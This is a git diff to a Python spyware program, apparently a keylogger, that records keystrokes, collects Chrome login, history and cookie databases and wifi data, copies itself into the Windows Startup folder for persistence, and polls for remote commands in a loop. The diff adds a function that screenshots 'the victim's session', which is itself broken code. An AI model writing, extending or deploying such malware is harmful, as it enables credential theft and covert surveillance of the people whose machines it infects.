@@ -7,6 +7,7 @@ from email.mime.text import MIMEText
 from os import getcwd, path
 from subprocess import check_output
 from time import sleep
+import pyscreeze
 
 import keyboard
 
@@ -53,7 +54,7 @@ def on_press(event):
 
 
 def get_chrome_data():
-    '''Returns a list with the respective paths of the login history  and cookie SQL databases'''
+    '''Returns a list with the respective paths of the login, history and cookie SQL databases'''
     try:
         global log
         logprint("INFO: Attempting to retrieve chrome data...\n")
@@ -115,11 +116,17 @@ def get_wifi_data():
         return file_path
 
 
-def make_persistent(current_file_name):
+def take_screenshot():
+    '''Takes a screenshot of the victim's session and return its file path'''
+    screenshot = pyscreeze.screenshot('ico.png') 
+    return getcwd(screenshot)
+
+
+def make_persistent():
     '''Adds program to Startup Files, making it persist after reboots.'''
     logprint("INFO: Attempting to become persistent...")
     current_file_path = "{}/{}".format(getcwd().replace('\\',
-                                       '/'), current_file_name)
+                                       '/'), __file__)
     new_file_path = "{}/{}".format(path.expanduser('~').replace(
         '\\', '/'), "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
     try:
@@ -261,9 +268,6 @@ def fetch_commands():
 
 
 keyboard.on_press(on_press)
-# get_chrome_data()
-# get_wifi_data()
-# make_persistent()
 while 1:
     fetch_commands()
     sleep(SENDING_INTERVAL)
